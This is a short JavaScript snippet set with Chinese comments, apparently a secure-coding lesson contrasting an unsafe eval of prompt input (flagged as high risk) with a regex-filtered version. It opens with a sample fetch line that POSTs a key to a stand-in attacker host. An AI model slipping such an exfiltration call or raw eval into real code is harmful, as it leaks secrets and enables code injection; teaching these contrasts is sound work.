fetch("http://malicious.site", { method: "POST", body: "key" });


const userInput = prompt("请输入要计算的表达式:");
eval(userInput); // ⚠️ 高危：用户输入直接被执行


const userInput = prompt("请输入算式（只允许数字和运算符）:");
if (/^[0-9+\-*/().\s]+$/.test(userInput)) {
  const result = Function('"use strict"; return (' + userInput + ')')();
  console.log(result);
} else {
  console.warn("非法输入");
}